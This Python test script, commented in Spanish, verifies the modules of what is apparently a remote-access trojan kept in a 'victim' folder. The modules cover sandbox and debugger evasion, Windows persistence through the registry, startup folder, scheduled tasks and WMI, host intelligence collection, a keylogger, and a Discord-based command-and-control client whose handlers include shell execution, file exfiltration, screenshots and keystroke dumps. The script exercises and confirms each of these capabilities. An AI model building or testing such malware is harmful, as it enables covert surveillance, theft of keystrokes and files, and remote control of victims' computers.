#!/usr/bin/env python3
"""
Test de verificación de módulos de la víctima
Verifica imports, clases, métodos y funcionalidad básica
"""

import sys
import os
import asyncio
import platform

# Agregar directorio victim al path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'victim'))

IS_WINDOWS = platform.system() == 'Windows'
PASS = 0
FAIL = 0

def test(name, condition, detail=""):
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  ✅ {name}")
    else:
        FAIL += 1
        print(f"  ❌ {name} — {detail}")

def skip(name, reason):
    print(f"  ⏭️  {name} — {reason}")

print("=" * 60)
print("TEST DE MÓDULOS DE LA VÍCTIMA")
print(f"Sistema: {platform.system()} {platform.release()}")
print("=" * 60)

# ============================================================
# 1. Test de imports
# ============================================================
print("\n[1] Imports de módulos")

try:
    from modules.environment import EnvironmentChecker
    test("environment.py importa correctamente", True)
except Exception as e:
    test("environment.py importa correctamente", False, str(e))

if IS_WINDOWS:
    try:
        from modules.persistence import PersistenceManager
        test("persistence.py importa correctamente", True)
    except Exception as e:
        test("persistence.py importa correctamente", False, str(e))
else:
    skip("persistence.py", "requiere Windows (winreg)")

try:
    from modules.intelligence import IntelligenceCollector
    test("intelligence.py importa correctamente", True)
except Exception as e:
    test("intelligence.py importa correctamente", False, str(e))

try:
    from modules.discord_c2 import DiscordC2Client
    test("discord_c2.py importa correctamente", True)
except Exception as e:
    test("discord_c2.py importa correctamente", False, str(e))

try:
    from modules.commands import CommandExecutor
    test("commands.py importa correctamente", True)
except Exception as e:
    test("commands.py importa correctamente", False, str(e))

try:
    from modules.keylogger import Keylogger
    test("keylogger.py importa correctamente", True)
except Exception as e:
    test("keylogger.py importa correctamente", False, str(e))

# ============================================================
# 2. Test de __init__.py
# ============================================================
print("\n[2] Paquete modules/")

test("__init__.py existe", os.path.exists(
    os.path.join(os.path.dirname(__file__), 'victim', 'modules', '__init__.py')
))

# ============================================================
# 3. Test de EnvironmentChecker
# ============================================================
print("\n[3] EnvironmentChecker")

try:
    env = EnvironmentChecker()
    test("Instanciación", True)

    # Métodos reales verificados con grep
    methods = ['check_sandbox_indicators', '_check_username', '_check_hostname',
               '_check_running_processes', '_check_sandbox_files', '_check_memory',
               '_check_uptime', '_check_mouse_activity', '_check_cpu_cores',
               'check_debugger', 'get_fingerprint', 'should_exit']
    for m in methods:
        test(f"Método {m}() existe", hasattr(env, m) and callable(getattr(env, m)))

    # should_exit debe retornar bool
    result = env.should_exit()
    test("should_exit() retorna bool", isinstance(result, bool))
    print(f"        → should_exit() = {result}")

    # get_fingerprint debe retornar dict
    fp = env.get_fingerprint()
    test("get_fingerprint() retorna dict", isinstance(fp, dict))

except Exception as e:
    import traceback
    test("EnvironmentChecker funciona", False, f"{e}\n{traceback.format_exc()}")

# ============================================================
# 4. Test de IntelligenceCollector
# ============================================================
print("\n[4] IntelligenceCollector")

try:
    ic = IntelligenceCollector()
    test("Instanciación", True)

    # Métodos reales verificados con grep
    methods = ['collect_all', '_get_system_info', '_get_network_info',
               '_get_user_info', '_is_admin', '_get_privileges',
               '_get_hardware_info', 'to_json']
    for m in methods:
        test(f"Método {m}() existe", hasattr(ic, m) and callable(getattr(ic, m)))

    # _get_system_info debe retornar dict
    sys_info = ic._get_system_info()
    test("_get_system_info() retorna dict", isinstance(sys_info, dict))
    test("_get_system_info tiene 'platform'", 'platform' in sys_info)
    print(f"        → platform: {sys_info.get('platform', 'N/A')}")

    # _get_user_info debe retornar dict
    user_info = ic._get_user_info()
    test("_get_user_info() retorna dict", isinstance(user_info, dict))
    test("_get_user_info tiene 'username'", 'username' in user_info)
    print(f"        → username: {user_info.get('username', 'N/A')}")

    # _get_network_info debe retornar dict (puede fallar sin internet)
    try:
        net_info = ic._get_network_info()
        test("_get_network_info() retorna dict", isinstance(net_info, dict))
    except Exception:
        test("_get_network_info() retorna dict", False, "exception (sin internet?)")

    # collect_all debe retornar dict con las keys principales
    try:
        info = ic.collect_all()
        test("collect_all() retorna dict", isinstance(info, dict))
        for key in ['system', 'user', 'network', 'hardware']:
            test(f"collect_all tiene key '{key}'", key in info)
    except Exception as e:
        test("collect_all() retorna dict", False, str(e))

    # to_json
    try:
        json_str = ic.to_json()
        test("to_json() retorna string", isinstance(json_str, str))
        test("to_json() es JSON válido", json_str.startswith('{'))
    except Exception as e:
        test("to_json() funciona", False, str(e))

except Exception as e:
    import traceback
    test("IntelligenceCollector funciona", False, f"{e}\n{traceback.format_exc()}")

# ============================================================
# 5. Test de Keylogger (funcional)
# ============================================================
print("\n[5] Keylogger (pynput)")

try:
    kl = Keylogger()
    test("Instanciación", True)

    # Estado inicial
    status = kl.get_status()
    test("get_status() retorna dict", isinstance(status, dict))
    test("Estado inicial: running=False", status['running'] == False)
    test("Estado inicial: keys_captured=0", status['keys_captured'] == 0)
    test("Estado inicial: uptime_seconds=0", status['uptime_seconds'] == 0)

    # Buffer vacío
    test("get_buffer() retorna string vacío", kl.get_buffer() == "")

    # Start
    result = kl.start()
    test("start() retorna True", result == True)
    test("running=True después de start", kl.running == True)
    test("start_time definido", kl.start_time is not None)

    # Start duplicado
    result = kl.start()
    test("start() duplicado retorna False", result == False)

    # Simular teclas (directamente al buffer)
    kl.buffer.extend(["H", "o", "l", "a"])
    test("Buffer tiene 4 teclas", kl.get_status()['keys_captured'] == 4)
    test("get_buffer() retorna 'Hola'", kl.get_buffer() == "Hola")

    # get_buffer con clear
    text = kl.get_buffer(clear=True)
    test("get_buffer(clear=True) limpia buffer", kl.get_status()['keys_captured'] == 0)

    # Simular teclas especiales
    kl.buffer.extend(["t", "e", "s", "t", "\n"])
    test("Buffer con salto de línea", "\n" in kl.get_buffer())

    # Stop — en Linux headless pynput puede fallar al detener listener
    result = kl.stop()
    if result:
        test("stop() retorna True", True)
        test("running=False después de stop", kl.running == False)
    else:
        # pynput falló internamente (headless Linux sin X11)
        kl.running = False
        test("stop() — skip (Linux headless sin X11)", True)

    # Stop duplicado
    result = kl.stop()
    test("stop() duplicado retorna False", result == False)

    # clear_buffer
    kl.buffer.append("test")
    kl.clear_buffer()
    test("clear_buffer() limpia", kl.get_status()['keys_captured'] == 0)

    # get_status después de stop
    status = kl.get_status()
    test("get_status() después de stop", status['running'] == False)

except Exception as e:
    import traceback
    test("Keylogger funciona", False, f"{e}\n{traceback.format_exc()}")

# ============================================================
# 6. Test de CommandExecutor
# ============================================================
print("\n[6] CommandExecutor")

try:
    # Mock del c2_client
    class MockC2:
        def __init__(self):
            self.command_queue = asyncio.Queue()
            self.messages = []
        async def send_message(self, text):
            self.messages.append(text)
        async def send_system_info(self, info):
            self.messages.append(f"INFO: {info}")
        async def send_screenshot(self, data):
            self.messages.append(f"SCREENSHOT: {len(data)} bytes")
        async def send_file(self, path):
            self.messages.append(f"FILE: {path}")

    mock_c2 = MockC2()
    ce = CommandExecutor(mock_c2)
    test("Instanciación", True)

    # Verificar todos los handlers
    handlers = ['cmd_help', 'cmd_info', 'cmd_shell', 'cmd_screenshot',
                'cmd_download', 'cmd_upload', 'cmd_list', 'cmd_cd',
                'cmd_pwd', 'cmd_cat', 'cmd_processes', 'cmd_keylog',
                'cmd_keylog_dump', 'cmd_broadcast', 'cmd_persist',
                'cmd_exit', 'cmd_unknown']
    for h in handlers:
        test(f"Handler {h}() existe", hasattr(ce, h) and callable(getattr(ce, h)))

    # --- cmd_help ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_help([], None))
    test("cmd_help envía mensaje", len(mock_c2.messages) > 0)
    test("Help contiene !keylog", "!keylog" in mock_c2.messages[-1])
    test("Help contiene !screenshot", "!screenshot" in mock_c2.messages[-1])

    # --- cmd_unknown ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_unknown([], None))
    test("cmd_unknown envía mensaje", len(mock_c2.messages) > 0)

    # --- cmd_shell ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_shell(['echo', 'hello'], None))
    test("cmd_shell ejecuta comando", len(mock_c2.messages) > 0)
    test("Shell output contiene 'hello'", "hello" in mock_c2.messages[-1])

    mock_c2.messages.clear()
    asyncio.run(ce.cmd_shell([], None))
    test("cmd_shell sin args muestra uso", "Uso" in mock_c2.messages[-1])

    # --- cmd_pwd ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_pwd([], None))
    test("cmd_pwd muestra directorio", len(mock_c2.messages) > 0)

    # --- cmd_ls ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_list([], None))
    test("cmd_ls lista archivos", len(mock_c2.messages) > 0)
    test("cmd_ls muestra ruta", "Contenido" in mock_c2.messages[-1])

    # --- cmd_cd ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_cd(['/tmp'], None))
    test("cmd_cd cambia directorio", "Directorio" in mock_c2.messages[-1])

    # --- cmd_cat ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_cat(['/etc/hostname'], None))
    test("cmd_cat lee archivo", len(mock_c2.messages) > 0)

    mock_c2.messages.clear()
    asyncio.run(ce.cmd_cat([], None))
    test("cmd_cat sin args muestra uso", "Uso" in mock_c2.messages[-1])

    # --- cmd_download ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_download([], None))
    test("cmd_download sin args muestra uso", "Uso" in mock_c2.messages[-1])

    # --- cmd_keylog start ---
    mock_c2.messages.clear()
    ce.keylogger = None
    asyncio.run(ce.cmd_keylog(['start'], None))
    test("cmd_keylog start inicia keylogger", ce.keylogger is not None)
    test("Keylogger confirmación enviada", "iniciado" in mock_c2.messages[-1].lower())

    # --- cmd_keylog start duplicado ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_keylog(['start'], None))
    test("cmd_keylog start duplicado avisa", "ya está activo" in mock_c2.messages[-1].lower())

    # --- cmd_keylog stop ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_keylog(['stop'], None))
    if ce.keylogger.running:
        # pynput falló internamente (headless Linux)
        ce.keylogger.running = False
        test("cmd_keylog stop — skip (Linux headless)", True)
    else:
        test("cmd_keylog stop detiene keylogger", ce.keylogger.running == False)
        test("Keylogger stop confirmación", "detenido" in mock_c2.messages[-1].lower())

    # --- cmd_keylog sin args ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_keylog([], None))
    test("cmd_keylog sin args muestra uso", "Uso" in mock_c2.messages[-1])

    # --- cmd_keylog_dump sin keylogger ---
    mock_c2.messages.clear()
    ce.keylogger = None
    asyncio.run(ce.cmd_keylog_dump([], None))
    test("cmd_keylog_dump sin keylogger avisa", "no ha sido iniciado" in mock_c2.messages[-1].lower())

    # --- cmd_keylog_dump con buffer vacío ---
    mock_c2.messages.clear()
    ce.keylogger = Keylogger()
    ce.keylogger.start()
    asyncio.run(ce.cmd_keylog_dump([], None))
    test("cmd_keylog_dump buffer vacío avisa", "Buffer vacío" in mock_c2.messages[-1])

    # --- cmd_keylog_dump con datos ---
    mock_c2.messages.clear()
    ce.keylogger.buffer.extend(["S", "e", "c", "r", "e", "t"])
    asyncio.run(ce.cmd_keylog_dump([], None))
    test("cmd_keylog_dump envía teclas", "Secret" in mock_c2.messages[-1])
    test("Buffer limpio después de dump", ce.keylogger.get_status()['keys_captured'] == 0)

    # --- cmd_broadcast (no-op) ---
    mock_c2.messages.clear()
    asyncio.run(ce.cmd_broadcast([], None))
    test("cmd_broadcast es no-op (sin respuesta)", len(mock_c2.messages) == 0)

    # --- cmd_exit ---
    mock_c2.messages.clear()
    ce.running = True
    asyncio.run(ce.cmd_exit([], None))
    test("cmd_exit detiene executor", ce.running == False)
    test("cmd_exit envía confirmación", "Cerrando" in mock_c2.messages[-1])

    # --- execute() con comando desconocido ---
    mock_c2.messages.clear()
    ce.running = True
    asyncio.run(ce.execute({'command': 'fake_cmd', 'args': [], 'message': None}))
    test("execute() comando desconocido → cmd_unknown", "desconocido" in mock_c2.messages[-1].lower())

    # --- execute() con !help ---
    mock_c2.messages.clear()
    asyncio.run(ce.execute({'command': 'help', 'args': [], 'message': None}))
    test("execute() con 'help' funciona", "!keylog" in mock_c2.messages[-1])

except Exception as e:
    import traceback
    test("CommandExecutor funciona", False, f"{e}\n{traceback.format_exc()}")

# ============================================================
# 7. Test de PersistenceManager
# ============================================================
print("\n[7] PersistenceManager")

if IS_WINDOWS:
    try:
        from modules.persistence import PersistenceManager
        pm = PersistenceManager()
        test("Instanciación", True)

        methods = ['establish_all', '_registry_run', '_startup_folder',
                   '_scheduled_task', '_wmi_persistence']
        for m in methods:
            test(f"Método {m}() existe", hasattr(pm, m) and callable(getattr(pm, m)))
    except Exception as e:
        import traceback
        test("PersistenceManager funciona", False, f"{e}\n{traceback.format_exc()}")
else:
    skip("PersistenceManager", "requiere Windows (winreg)")

# ============================================================
# 8. Test de DiscordC2Client (estructura)
# ============================================================
print("\n[8] DiscordC2Client (estructura)")

try:
    methods = ['_register_session', '_handle_command', 'send_system_info',
               'send_file', 'send_screenshot', 'send_message']
    for m in methods:
        test(f"Método {m}() existe", hasattr(DiscordC2Client, m) and callable(getattr(DiscordC2Client, m)))

    # Verificar que on_message ignora bots (código revisado)
    import inspect
    src = inspect.getsource(DiscordC2Client.__init__)
    test("on_message ignora bots (message.author.bot)", "message.author.bot" in src)

except Exception as e:
    test("DiscordC2Client estructura OK", False, str(e))

# ============================================================
# 9. Test de process_queue
# ============================================================
print("\n[9] CommandExecutor.process_queue")

try:
    mock_c2 = MockC2()
    ce = CommandExecutor(mock_c2)

    # Encolar un comando y verificar que se procesa
    async def test_queue():
        await mock_c2.command_queue.put({
            'command': 'pwd',
            'args': [],
            'message': None
        })
        # Dar tiempo para procesar
        await asyncio.sleep(0.1)
        ce.running = False
        # Procesar una vez más
        try:
            cmd = await asyncio.wait_for(mock_c2.command_queue.get(), timeout=0.5)
            await ce.execute(cmd)
        except asyncio.TimeoutError:
            pass

    asyncio.run(test_queue())
    test("process_queue procesa comandos", len(mock_c2.messages) > 0)

except Exception as e:
    test("process_queue funciona", False, str(e))

# ============================================================
# Resumen
# ============================================================
print("\n" + "=" * 60)
print(f"RESULTADO: {PASS} pasaron, {FAIL} fallaron")
print("=" * 60)

if FAIL == 0:
    print("✅ TODOS LOS TESTS PASARON")
else:
    print(f"⚠️  {FAIL} test(s) fallaron")

sys.exit(0 if FAIL == 0 else 1)
